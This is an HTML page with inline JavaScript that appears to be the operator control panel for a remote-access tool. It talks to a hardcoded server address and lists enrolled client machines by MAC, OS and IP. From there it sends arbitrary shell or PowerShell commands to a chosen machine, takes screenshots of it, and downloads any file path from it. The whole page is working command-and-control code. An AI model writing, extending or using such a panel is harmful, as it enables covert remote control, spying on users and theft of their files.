<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Control</title>
    <script>
        JSON.safeParse = function (str) {
            try {
                return this.parse(str);
            } catch (e) {
                return false;
            }
        };
        function getUrl(data) {
            let url = "http://3.89.196.174:6702/?";
            let arr = [];
            for (let prop in data) {
                if (data.hasOwnProperty(prop)) {
                    arr.push(encodeURI(prop) + "=" + encodeURI(data[prop]).replace("&", "%26"));
                }
            }
            url += arr.join("&");
            return url;
        }
        function query(data, callback) {
            let url = getUrl(data);
            console.log(url);
            let xhr = new XMLHttpRequest();
            xhr.open("GET", url);
            xhr.onreadystatechange = function () {
                if(xhr.readyState === XMLHttpRequest.DONE) {
                    if (typeof callback === "function") callback(xhr.responseText, xhr.status);
                }
            };
            xhr.onerror = e => console.log(e);
            xhr.send();
        }

        window.onload = function() {
            query({"clients": "kar"}, (data) => {
                let arr = JSON.safeParse(data);
                if (arr) {
                    for (let client of arr) {
                        let option = document.createElement("option");
                        option.value = client.mac;
                        option.innerText = client.mac + " " + client.os + " (" + client.ip + ":" + client.port + ")";
                        document.querySelector("#client").appendChild(option);
                    }
                }
            });
            document.querySelector("#send").onclick = function() {
                document.querySelector("#result").innerHTML = "";
                let e = document.querySelector("#client");
                let mac = e.options[e.selectedIndex].value;
                let command = document.querySelector("#command").value;
                let data;
                data = !document.querySelector("#is_psl").checked ? {
                    mac: mac,
                    command: command,
                } : {
                    mac: mac,
                    psl: command,
                };
                console.log(data);
                query(data, (result, code) => {
                    if (code === 200) {
                        document.querySelector("#result").innerText = result;
                    } else alert("error: " + result);
                });
            };
            document.querySelector("#screenshot").onclick = function() {
                document.querySelector("#result").innerHTML = "";
                let e = document.querySelector("#client");
                let mac = e.options[e.selectedIndex].value;
                let img = document.createElement("img");
                img.src = getUrl({
                    mac: mac,
                    screenshot: "",
                    kar: new Date().getTime()
                });
                img.width = 1000;
                document.querySelector("#result").appendChild(img);
            };
            document.querySelector("#download").onclick = function() {
                document.querySelector("#result").innerHTML = "";
                let e = document.querySelector("#client");
                let mac = e.options[e.selectedIndex].value;
                let path = document.querySelector("#path").value;
                query({
                    mac: mac,
                    path: path
                }, result => {
                    let a = document.createElement("a");
                    a.target = "_blank";
                    a.download = (() => {
                        let arr = path.split(/[\\/]/);
                        return arr[arr.length - 1];
                    })();
                    a.innerText = "Download";
                    a.href = URL.createObjectURL(new Blob([result]));
                    document.querySelector("#result").appendChild(a);
                });
            };
        }
    </script>
</head>
<body>
<label for="client">Select client: </label><select id="client"></select><br>
<label for="command">Command: </label><textarea id="command"></textarea><br>
<label for="is_psl">Is PSL? </label><input type="checkbox" id="is_psl"><br>
<button id="send">Send</button><br>
<button id="screenshot">Screenshot</button><br>
<label for="path">Path: </label><input type="text" id="path"><button id="download">Download</button>
<label for="result">Result: </label><pre style="border: 1px solid black" id="result"></pre>
</body>
</html>